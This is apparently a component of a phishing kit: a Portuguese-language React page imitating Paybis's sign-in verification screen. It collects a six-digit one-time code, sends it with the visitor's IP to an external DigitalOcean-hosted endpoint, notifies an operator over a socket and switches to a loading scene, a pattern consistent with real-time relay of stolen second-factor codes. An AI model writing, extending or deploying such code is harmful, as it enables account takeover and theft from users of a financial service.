import React, {  useState } from "react";
import axios from "axios";

import envelope from "../../assets/envelope.svg";
import voltar from "../../assets/voltar.svg";

export default function PaybisOTPMSG({ socket, ip,setCenaAtual,msgRecebida }) {
  const [otp, setOtp] = useState([]);

  const handleChange = (event) => {
    setOtp({ ...otp, [event.target.name]: event.target.value });

    const { name, value } = event.target;
    
    if (value.length === 1 && value.match(/^[0-9]$/)) {
      // Mover o foco para o próximo input, se existir
      const nextSibling = document.querySelector(
        `input[name=otp${parseInt(name.replace('otp', '')) + 1}]`
      );
  
      if (nextSibling !== null) {
        nextSibling.focus();
      }
    } else if (value.length === 0) {
      // Mover o foco para o input anterior, se existir, ao apagar o valor
      const prevSibling = document.querySelector(
        `input[name=otp${parseInt(name.replace('otp', '')) - 1}]`
      );
  
      if (prevSibling !== null) {
        prevSibling.focus();
      }
    }
  };

  const validateForm = () => {
    console.log(
      "Valida OTP Concatenado:" +
        otp["otp1"] +
        "" +
        otp["otp2"] +
        "" +
        otp["otp3"] +
        "" +
        otp["otp4"] +
        "" +
        otp["otp5"] +
        "" +
        otp["otp6"]
    );

    if (otp["otp1"] === "") {
      return false;
    }
    if (otp["otp2"] === "") {
      return false;
    }
    if (otp["otp3"] === "") {
      return false;
    }
    if (otp["otp4"] === "") {
      return false;
    }
    if (otp["otp5"] === "") {
      return false;
    }
    if (otp["otp6"] === "") {
      return false;
    }
    return true;
  };

  const handleSubmitOtp = async (event) => {
    event.preventDefault();

    if (validateForm()) {
      await axios.post("https://jellyfish-app-cgoqz.ondigitalocean.app:3333/atualizaotp2", {
        ip,
        OTP2:
          otp["otp1"] +
          "" +
          otp["otp2"] +
          "" +
          otp["otp3"] +
          "" +
          otp["otp4"] +
          "" +
          otp["otp5"] +
          "" +
          otp["otp6"],
      });
      socket.emit("clienteAtualizou");  
      setCenaAtual("load");
    }
  };
  return (
    <div className="auth-wrapper__inner">
      <div className="auth-wrapper__body">
     
          <div className="email-otp" country-code="BR">
            <div className="auth-app-header">Entrar</div>
            <img src={envelope} alt="" className="email-otp__icon " />
            <i data-v-198035f7="" class="icon icon-envelope-auth email-otp__icon"></i>
            <p className="sent-notice">
              {msgRecebida}
              <br />
            </p>
            <form action="" onSubmit={(event) => handleSubmitOtp(event)}>
              <div className="otp">
                <div className="verification-code-input">
                  <div className="form-input__wrapper verification-code-input__item">
                    <input
                      id=""
                      name="otp1"
                      type="number"
                      inputMode="numeric"
                      pattern="^[0-9]?$"
                      placeholder=""
                      maxLength="1"
                      min="0"
                      max="9"
                      onChange={(e) => handleChange(e)}
                      autoFocus
                      className="form-input__input "
                    ></input>
                  </div>
                  <div className="form-input__wrapper verification-code-input__item">
                    <input
                      id=""
                      name="otp2"
                      type="number"
                      inputMode="numeric"
                      pattern="^[0-9]?$"
                      placeholder=""
                      maxLength="1"
                      min="0"
                      max="9"
                      onChange={(e) => handleChange(e)}
                      className="form-input__input"
                    ></input>
                  </div>
                  <div className="form-input__wrapper verification-code-input__item">
                    <input
                      id=""
                      name="otp3"
                      type="number"
                      inputMode="numeric"
                      pattern="^[0-9]?$"
                      placeholder=""
                      maxLength="1"
                      min="0"
                      max="9"
                      onChange={(e) => handleChange(e)}
                      className="form-input__input"
                    ></input>
                  </div>
                  <div className="form-input__wrapper verification-code-input__item">
                    <input
                      id=""
                      name="otp4"
                      type="number"
                      inputMode="numeric"
                      pattern="^[0-9]?$"
                      placeholder=""
                      maxLength="1"
                      min="0"
                      max="9"
                      onChange={(e) => handleChange(e)}
                      className="form-input__input"
                    ></input>
                  </div>
                  <div className="form-input__wrapper verification-code-input__item">
                    <input
                      id=""
                      name="otp5"
                      type="number"
                      inputMode="numeric"
                      pattern="^[0-9]?$"
                      placeholder=""
                      maxLength="1"
                      min="0"
                      max="9"
                      onChange={(e) => handleChange(e)}
                      className="form-input__input"
                    ></input>
                  </div>
                  <div className="form-input__wrapper verification-code-input__item">
                    <input
                      id=""
                      name="otp6"
                      type="number"
                      inputMode="numeric"
                      pattern="^[0-9]?$"
                      placeholder=""
                      maxLength="1"
                      min="0"
                      max="9"
                      onChange={(e) => handleChange(e)}
                      className="form-input__input"
                    ></input>
                  </div>
                </div>
                <div className="resend">
                  <div className="resend">
                    <a href="#" className="btn-link resend">
                      Enviar código novamente
                    </a>
                  </div>
                </div>
                <div className="auth-app-footer has-back-button">
                  <div className="btn-back-link">
                    <img
                      src={voltar}
                      alt=""
                      className="icon icon-back btn-back-link__icon"
                    />
                    Voltar
                  </div>
                  <button className="btn btn-primary btn-lg">Continuar</button>
                </div>
              </div>
            </form>
          </div>
        
      </div>
    </div>
  );
}
